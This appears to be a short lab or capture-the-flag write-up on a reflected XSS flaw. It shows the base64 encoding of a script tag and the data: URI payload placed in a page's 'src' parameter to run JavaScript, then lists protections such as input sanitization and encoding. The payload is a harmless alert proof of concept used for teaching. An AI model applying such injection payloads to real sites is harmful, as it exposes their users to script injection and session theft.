# Vulnerability

The idea behind is to change the src parameter so that we can run a JS script inside the page

On the Home page click on the NSA icon that should redirect you to this URL:
http://<IP>/?page=media&src=nsa

Encode in base64 a simple JS script:
```
echo -e "<script>alert('42')</script>" | base64 -> PHNjcmlwdD5hbGVydCgnNDInKTwvc2NyaXB0Pgo=
```

Now we just need to put the data uri `header` and our `payload` on the `src` parameter, the final URL will looks like this:
http://<IP>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnNDInKTwvc2NyaXB0Pgo=
                                ^                                   ^
                                |                                   |
                              Header                          Actual Payload

# Protection

- Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches.
- Convert special characters such as ?, &, /, <, > and spaces to their respective HTML or URL encoded equivalents.
- Give users the option to disable client-side scripts.
- Redirect invalid requests.

# Source

https://snyk.io/vuln/npm:markdown-it:20160912

